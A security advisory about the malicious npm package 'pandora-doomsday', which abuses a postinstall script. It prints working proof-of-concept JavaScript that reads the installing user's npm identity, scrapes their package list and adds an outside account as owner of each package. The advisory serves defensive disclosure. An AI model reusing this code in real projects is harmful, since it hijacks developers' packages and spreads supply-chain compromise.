## Overview
`pandora-doomsday` is a malicious package that uses `postinstall` scripts to perform malicious activity, like adding the owner of the malicious package as an owner to all packages owned by the user who performed `npm install`.

This is especially dangerous in production runtime environments, where environment variables tend to consist of keys, passwords, tokens and other secrets.

PoC:
```js
function currentUser(cb) {
  exec('npm whoami', function (err, stdout, stderr) {
    if (!err) cb(stdout);
  });
}

function addOwner(packageName, newOwner) {
  exec('npm owner add ' + newOwner + ' ' + packageName);
}

function getModulesOwned(user, cb) {
  var url = 'https://www.npmjs.org/~' + user;

  request(url, function (error, response, body) {
    var $ = cheerio.load(body);
    var packages = $('.collaborated-packages a').map(function (i, el) {
      return $(this).text();
    }).get();

    cb(packages);
  });
}

currentUser(function (user) {
  if (user) {
    getModulesOwned(user, function (modules) {
      modules.forEach(function (moduleName) {
        addOwner(moduleName, 'mr_robot');
      });
    });
  }
});
```



The list of packages and their scripts are:
```
shrugging-logging
test-module-a
pandora-doomsday
```

## Remediation
Avoid usage of this package altogether.

## References
- [Hunting Malicious packages published on npm](https://duo.com/blog/hunting-malicious-npm-packages/)